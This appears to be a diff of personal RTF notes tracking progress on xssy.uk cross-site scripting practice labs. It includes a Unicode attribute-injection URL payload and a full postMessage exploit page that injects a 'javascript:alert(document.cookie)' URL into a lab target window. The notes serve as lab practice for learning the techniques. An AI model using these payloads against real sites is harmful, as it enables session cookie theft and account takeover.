+\cf0 \expnd0\expndtw0\kerning0
+https://xssy.uk/lab/775: Integrity Policy \'a0\kerning1\expnd0\expndtw0 \
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0
+\cf0 \expnd0\expndtw0\kerning0
+Not yet\
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0
+\cf0 \kerning1\expnd0\expndtw0 \
+https://xssy.uk/lab/857: \expnd0\expndtw0\kerning0
+URL DOM XSS \'a0\kerning1\expnd0\expndtw0 \
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0
+\cf0 \expnd0\expndtw0\kerning0
+Not yet\kerning1\expnd0\expndtw0 \
+\
+\pard\pardeftab720\partightenfactor0
+\cf0 \expnd0\expndtw0\kerning0
+https://xssy.uk/lab/884: Templates 2 \'a0\kerning1\expnd0\expndtw0 \
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0
+\cf0 \expnd0\expndtw0\kerning0
+Not yet\
+\
+\
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0
+
+\f0\b\fs28 \cf0 \kerning1\expnd0\expndtw0 \ul Master Level
+\f1\b0\fs24 \expnd0\expndtw0\kerning0
+\ulnone \
+\
+https://xssy.uk/lab/6: Unicode xss 2\
+https://ozb2apmi.xssy.uk/target.ftl?name=%0D%0A%CC%B8+onfocus%3D%22alert%28document.cookie%29%22+autofocus%3E\kerning1\expnd0\expndtw0 \
+\
+https://e3nwaisk.xssy.uk/: postMessage 2 [Learning new]\
+If we blocked because different origin postmessage\
+We can use redirect loop in postmessage, this is the example:\
+1. window.open https://e3nwaisk.xssy.uk/\
+2. setTimeout redirect again to https://e3nwaisk.xssy.uk/\
+karena https://e3nwaisk.xssy.uk/ & https://e3nwaisk.xssy.uk/ same origin\
+maka step 3 inject payload ini berhasil\
+3. baru inject payload: \cf9 \cb10 \expnd0\expndtw0\kerning0
+  open.postMessage("javascript:alert(document.cookie)", "*");\
+Full code:\cf0 \cb1 \kerning1\expnd0\expndtw0 \
+\pard\pardeftab720\partightenfactor0
+\cf9 \cb15 \expnd0\expndtw0\kerning0
+\outl0\strokewidth0 \strokec16   \strokec17 <body\strokec16  \strokec18 onload\strokec19 =\strokec20 "\strokec17 exploit\strokec19 ()\strokec20 "\strokec17 >\strokec19 \
+    \strokec17 <script>\strokec19 \
+\strokec16       \strokec21 function\strokec17  exploit\strokec19 ()\strokec17  \strokec19 \{\
+\strokec17         \strokec21 var\strokec17  \strokec22 open\strokec17  \strokec18 =\strokec17  \strokec21 window\strokec19 .\strokec17 open\strokec19 (\strokec20 "https://e3nwaisk.xssy.uk/"\strokec19 ,\strokec17  \strokec20 "exploit"\strokec19 );\
+\strokec17         \strokec21 window\strokec19 .\strokec17 setTimeout\strokec19 (()\strokec17  \strokec18 =>\strokec17  \strokec19 \{\
+\strokec17           \strokec22 open\strokec19 .\strokec17 postMessage\strokec19 (\strokec20 "https://e3nwaisk.xssy.uk/"\strokec19 ,\strokec17  \strokec20 "*"\strokec19 );\
+\strokec17           \strokec21 window\strokec19 .\strokec17 setTimeout\strokec19 (()\strokec17  \strokec18 =>\strokec17  \strokec19 \{\
+\strokec17             \strokec22 open\strokec19 .\strokec17 postMessage\strokec19 (\strokec20 "javascript:alert(document.cookie)"\strokec19 ,\strokec17  \strokec20 "*"\strokec19 );\
+\strokec17           \strokec19 \},\strokec17  \strokec23 500\strokec19 );\
+\strokec17         \strokec19 \},\strokec17  \strokec23 500\strokec19 );\
+\strokec17       \strokec19 \}\
+\strokec16     \strokec17 </script>\strokec19 \
+\strokec16     \strokec17 <iframe\strokec16  \strokec18 name\strokec19 =\strokec20 "exploit"\strokec16  \strokec17 />\strokec19 \
+\strokec16   \strokec17 </body>}
